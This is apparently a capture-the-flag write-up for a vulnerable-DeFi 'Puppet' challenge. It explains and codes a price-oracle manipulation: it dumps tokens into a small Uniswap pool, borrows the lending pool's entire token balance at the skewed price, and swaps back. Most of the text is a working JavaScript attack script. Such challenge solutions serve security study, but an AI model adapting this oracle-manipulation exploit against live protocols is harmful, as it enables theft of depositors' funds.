## Explanation
We have 25 eth and 1000 DVTs, the uniswap has 10 eth and 10 DVT which make 1 DVT == 1 eth.
So we want to manipulate the price of uniswap so that 1 eth will be more than 1 DVT

## ATTACK
1. First we approve uniswap to swap our token.
2. Get 9 eth from converting tokens to eth.
3. Now we deposit eth to gain all tokens.
4. Then we get our original 1000 tokens back by swapping eth.

```javascript
        const attackPuppet = this.lendingPool.connect(attacker);
        const attackToken = this.token.connect(attacker);
        const attackUniSwap = this.uniswapExchange.connect(attacker);
        // Approve token to swap with UniSwap
        await attackToken.approve(attackUniSwap.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        // Calculate ETH Pay out
        await attackUniSwap.tokenToEthSwapInput(
            ATTACKER_INITIAL_TOKEN_BALANCE, // Exact amount of tokens to transfer
            ethers.utils.parseEther("9"), // we at least want to get 9 eth
            (await ethers.provider.getBlock('latest')).timestamp * 2, // max time for the transaction to be done
        )
        // Deposit ETH required to gain ALL tokens from the pool
        const deposit = await attackPuppet.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        await attackPuppet.borrow(POOL_INITIAL_TOKEN_BALANCE, {
            value: deposit
        })
        const ethReq = await attackUniSwap.getEthToTokenOutputPrice(ATTACKER_INITIAL_TOKEN_BALANCE,
        {
            gasLimit: 1e6
        })
        // Get our original 1000 tokens back by swapping eth
        await attackUniSwap.ethToTokenSwapOutput(
            ATTACKER_INITIAL_TOKEN_BALANCE,
            (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
            {
                value: ethReq,
                gasLimit: 1e6
            }
        )
```